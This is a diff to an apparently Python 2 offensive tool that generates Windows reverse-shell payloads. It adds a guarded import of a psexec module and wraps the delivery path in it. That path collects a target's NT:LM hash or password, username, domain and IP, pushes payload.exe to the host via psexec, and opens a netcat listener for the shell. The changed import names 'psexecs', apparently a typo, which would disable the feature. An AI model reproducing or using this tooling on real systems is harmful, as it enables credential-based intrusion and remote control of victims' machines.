@@ -17,8 +17,11 @@ import re
 import glob
 import readline
 import time
-import psexec
-
+try:
+    impacketerror = False
+    import psexecs
+except:
+    impacketerror = True
 
 t = blessings.Terminal()
 
@@ -201,6 +204,9 @@ print "  | |/ |/ / / / / / ____/ /_/ / /_/ / / /_/ / /_/ / /_/ (__  )".center(t.
 print "  |__/|__/_/_/ /_/_/    \__,_/\__, /_/\____/\__,_/\__,_/____/".center(t.width)
 print "   /____/".center(t.width)
 print t.normal + '=' * t.width
+
+if impacketerror == True:
+    print t.bold_red + '\n[*****] Install Impacket for Python from Git for Psexec to Work! (psexec disabled) [*****]\n' + t.normal
 
 try:
     print ('[1] Windows Reverse Shell' + t.bold_green + '(Stageless)' +
@@ -431,30 +437,33 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
             a.start()
 
     if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
-        while True:
-            targethash = raw_input(
-                '[*] Targets NT:LM Hash or Plain Text Password:')
-            targetusername = raw_input('[*] Targets Username:')
-            targetdomain = raw_input('[*] Targets Domain:')
-            targetipaddr = raw_input('[*] Targets Ip Address:')
-            print t.bold_green + 'NT:LM HASH OR PLAIN TEXT PASSWORD = ' + targethash + '\nTARGETS USERNAME = ' + targetusername + '\nTARGETS DOMAIN = ' + targetdomain + '\nTARGETS IP ADDRESS = ' + targetipaddr + t.normal
-            ispsexecdetailscorrect = raw_input(
-                '[*] Are These Details Correct? ([y]/n)')
-            if ispsexecdetailscorrect == 'y' or ispsexecdetailscorrect == '':
-                if re.search(':', targethash):
-                    print t.bold_green + '[*] NT:LM HASH DETECTED' + t.normal
-                    targetpassword = ''
+        if impacketerror == False:
+            while True:
+                targethash = raw_input(
+                    '[*] Targets NT:LM Hash or Plain Text Password:')
+                targetusername = raw_input('[*] Targets Username:')
+                targetdomain = raw_input('[*] Targets Domain:')
+                targetipaddr = raw_input('[*] Targets Ip Address:')
+                print t.bold_green + 'NT:LM HASH OR PLAIN TEXT PASSWORD = ' + targethash + '\nTARGETS USERNAME = ' + targetusername + '\nTARGETS DOMAIN = ' + targetdomain + '\nTARGETS IP ADDRESS = ' + targetipaddr + t.normal
+                ispsexecdetailscorrect = raw_input(
+                    '[*] Are These Details Correct? ([y]/n)')
+                if ispsexecdetailscorrect == 'y' or ispsexecdetailscorrect == '':
+                    if re.search(':', targethash):
+                        print t.bold_green + '[*] NT:LM HASH DETECTED' + t.normal
+                        targetpassword = ''
+                    else:
+                        print t.bold_green + '[*] CLEAR TEXT PASSWORD DETECTED' + t.normal
+                        targetpassword = targethash
+                        targethash = None
+                    break
                 else:
-                    print t.bold_green + '[*] CLEAR TEXT PASSWORD DETECTED' + t.normal
-                    targetpassword = targethash
-                    targethash = None
-                break
-            else:
-                continue
-        b = multiprocessing.Process(
-            target=ServePsexec, args=(payloaddir + '/payload.exe', targethash, targetusername, targetdomain, targetipaddr, targetpassword))
-        b.daemon = True
-        b.start()
+                    continue
+            b = multiprocessing.Process(
+                target=ServePsexec, args=(payloaddir + '/payload.exe', targethash, targetusername, targetdomain, targetipaddr, targetpassword))
+            b.daemon = True
+            b.start()
+        else:
+            print t.bold_red + '[*] Install Impacket for Python From Git!' + t.normal
 
     if menuchoice == '1':
         os.system('nc -lvp %s' % portnum)
